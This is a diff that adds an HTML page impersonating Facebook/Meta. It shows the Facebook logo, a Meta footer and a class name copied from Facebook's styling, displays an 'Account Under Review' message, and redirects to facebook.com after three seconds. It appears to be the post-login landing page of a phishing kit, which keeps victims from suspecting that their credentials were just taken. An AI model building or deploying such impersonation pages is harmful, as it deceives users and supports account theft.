@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Account Under Review</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="fb-logo.svg" type="image/jpeg">
+    <style>
+        body {
+            background: #f0f2f5;
+            font-family: Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            align-items: center;
+            justify-content: center;
+        }
+        .form-card {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px 0 rgba(0,0,0,0.1);
+            padding: 36px 24px 24px 24px;
+            max-width: 360px;
+            width: 90vw;
+            margin: 32px 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .logo {
+            height: 56px;
+            margin-bottom: 20px;
+        }
+        ._9axz {
+            font-size: 24px;
+            font-weight: bold;
+            color: #1c1e21;
+            text-align: center;
+        }
+        .review-message {
+            font-size: 17px;
+            color: #1c1e21;
+            margin: 22px 0 12px 0;
+            text-align: center;
+        }
+        .redirect-info {
+            font-size: 14px;
+            color: #65676b;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        .meta {
+            text-align: center;
+            margin-top: 14px;
+            font-size: 14px;
+            color: #65676b;
+        }
+        .meta-logo {
+            display: block;
+            margin: 8px auto 0 auto;
+            height: 20px;
+        }
+        @media (max-width: 540px){
+            .form-card {
+                border-radius: 0;
+                margin: 0;
+                min-height: 100vh;
+                box-shadow: none;
+                max-width: 100vw;
+                padding: 32px 5vw;
+            }
+            .logo {
+                margin-top: 44px;
+            }
+        }
+    </style>
+    <script>
+        setTimeout(function() {
+            window.location.href = "https://www.facebook.com";
+        }, 3000);
+    </script>
+</head>
+<body>
+    <div class="form-card">
+        <img src="fb-logo.svg" class="logo" alt="Facebook">
+        <div class="_9axz">Account Under Review</div>
+        <div class="review-message">
+            We’re reviewing your account information.<br>This can take up to 24 hours. Thank you for your patience.
+        </div>
+        <div class="redirect-info">
+            <em>You will be redirected shortly…</em>
+        </div>
+        <div class="meta">
+            <img src="meta-logo.png" class="meta-logo" alt="Meta" />
+            <span>Meta</span>
+        </div>
+    </div>
+</body>
+</html>
